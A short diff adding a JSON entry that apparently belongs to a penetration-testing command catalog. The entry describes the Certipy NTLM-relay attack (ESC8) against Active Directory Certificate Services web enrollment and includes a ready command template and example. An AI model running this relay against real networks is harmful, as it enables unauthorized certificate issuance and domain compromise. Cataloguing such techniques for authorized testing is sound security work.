@@ -1,0 +1,24 @@
+{
+  "id": "certipy-relay",
+  "name": "Certipy Relay to ADCS",
+  "command": "certipy relay -target 'http://<ip>/certsrv/certfnsh.asp' -ca '<ca_name>'",
+  "description": "Relay NTLM authentication to ADCS web enrollment to obtain a certificate",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "ntlm",
+    "http"
+  ],
+  "tags": [
+    "certipy",
+    "adcs",
+    "relay",
+    "esc8",
+    "web-enrollment"
+  ],
+  "examples": [
+    "certipy relay -target 'http://192.168.1.100/certsrv/certfnsh.asp' -ca 'CORP-CA'"
+  ]
+}
